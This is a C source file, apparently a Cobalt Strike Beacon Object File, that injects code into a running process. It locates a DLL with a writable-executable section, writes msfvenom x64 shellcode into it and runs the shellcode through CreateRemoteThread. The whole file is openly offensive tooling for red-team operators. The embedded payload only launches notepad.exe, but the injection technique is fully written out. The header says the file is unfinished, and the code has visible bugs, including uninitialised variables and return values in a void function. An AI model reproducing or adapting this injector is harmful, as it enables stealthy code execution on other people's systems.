/*
 * WIP, currently not functional. figuring out StartRoutine for NtCreateThreadEx
*/
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <string.h>
#include "beacon.h"

// needed to resolve linker errors
void ___chkstk_ms() { }

// process and module definitions
#define MODULE "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll" // change this based on dll of operator's choosing
#define OFFSET  0x001EC000 // change this based on dll of operator's choosing (testing 0x001EA800)
#define PROCESSID  30436 // change this based on running process with target module loaded

// BOF definitions for beacon linking
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINADVAPI WINAPI PSAPI$EnumProcessModulesEx(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded, DWORD dwFilterFlag);
WINADVAPI WINAPI PSAPI$GetModuleFileNameExA(HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize);
NSYSAPI NTSTATUS NTAPI NTDLL$NtWriteVirtualMemory(HANDLE hProcess, PVOID lpBaseAddress, PVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
NSYSAPI NTSTATUS NTAPI NTDLL$NtCreateThreadEx(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
WINBASEAPI int __cdecl MSVCRT$strcmp(const char* s1, const char* s2);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

// function name definitions for ease of use
#define OpenProcess             KERNEL32$OpenProcess
#define EnumProcessModulesEx    PSAPI$EnumProcessModulesEx
#define GetModuleFileNameExA    PSAPI$GetModuleFileNameExA
#define NtWriteVirtualMemory    NTDLL$NtWriteVirtualMemory
#define NtCreateThreadEx        NTDLL$NtCreateThreadEx
#define strcmp                  MSVCRT$strcmp
#define GetLastError            KERNEL32$GetLastError
#define CloseHandle             KERNEL32$CloseHandle

void go(char * buff, int len)
{
    HANDLE                  hProcess;
    HANDLE		    hThread = INVALID_HANDLE_VALUE;
    HMODULE                 hModules[1024];
    DWORD                   cbNeeded;
    DWORD                   dwFilter;
    HMODULE                 hDll;
    PVOID                   rwxSection;

    // msfvenom -p windows/x64/exec -a x64 --platform windows -f c cmd=notepad.exe
    unsigned char shellcode[] = 
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

    // obtain handle to the target process with necessary access rights
    hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PROCESSID);
    if (hProcess == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Open Process. Error Code: %d\n", GetLastError());
        return 1;
    }

    // enumerate remote modules, return array of handles
    if (!EnumProcessModulesEx(hProcess, hModules, sizeof(hModules), &cbNeeded, dwFilter))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Enumerate Modules. Error Code: %d\n", GetLastError());
        return 1;
    };

    // interate over handle array and find module of operator's choosing
    for (INT i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
    {
        CHAR szModName[MAX_PATH];
        if (GetModuleFileNameExA(hProcess, hModules[i], szModName, sizeof(szModName)))
        {
            if (strcmp(szModName, MODULE) == 0)
            {
                hDll = hModules[i];
                break;
            };
        };
    };

    // if no handle, die
    if (hDll == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Find Module: %d\n", GetLastError());
        return 1;
    };
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote DLL Address: %p\n", hDll);

    // calculate offset to RWX section 
    rwxSection = (PVOID)((ULONG_PTR)hDll + (ULONG_PTR)OFFSET);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote RWX Section Address: %p\n", rwxSection);

    // write to RWX section
    if (!WriteProcessMemory(hProcess, rwxSection, shellcode, sizeof(shellcode), NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] WriteProcessMemory Failed: %d\n", GetLastError());
        return 1;
    };

    // create thread and run shellcode
    if (!CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rwxSection, NULL, 0, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to Create Thread in Remote Process and Execute. Error Code: %d\n", GetLastError());
    }
    else
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode Successfully Executed in Remote Thread\n");
    }

    // close handles
    CloseHandle(hProcess);

    return 0;
}
